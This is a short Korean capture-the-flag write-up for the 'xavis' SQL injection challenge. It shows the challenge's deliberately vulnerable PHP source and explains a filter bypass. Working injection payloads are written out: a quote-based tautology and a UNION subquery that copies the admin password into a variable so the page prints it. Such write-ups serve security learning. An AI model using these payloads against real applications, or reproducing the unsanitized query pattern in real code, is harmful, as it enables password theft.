# xavis

소스코드는 다음과 같다.
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(preg_match('/regex|like/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_xavis where id='admin' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_xavis where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("xavis"); 
  highlight_file(__FILE__); 
?>
```
`blind SQLI`를 진행해서 `admin`계정의 `password`를 알아내는 것 같다.

취약점을 찾아보니 이전에 풀던 문제들처럼 `'`으로 우회가 가능했다.
> ?pw=%27||%271%27=%271

분명 문제를 풀기 위한 다른 키워드가 있을 것이다.

그래서 전에 쓰던 코드들을 이용하여 찾아봐도 아무리 값이 안나온다.
`0-9a-z`의 범위에 없는것이다.

그래서 확장 아스키코드를 쓰거나, 유니코드를 쓰거나 여러 방법들을 총동원하여 찾아야하지만

`preg_match`에 `union`이 포함이 안되어있네요

`union`키워드를 이용하여, 서브쿼리에 변수를 이용해 값을 넣고 출력할 예정이다.

> ?pw=%27||%20(select%20@a:=pw%20where%20id=%27admin%27)%20union%20select%20@a%23
> select id from prob_xavis where id='admin' and pw=''|| (select @a:=pw where id='admin') union select @a#'

이런 코드가 나오고 `pw`가 같이 출력된다.
이를 이용해 Clear!
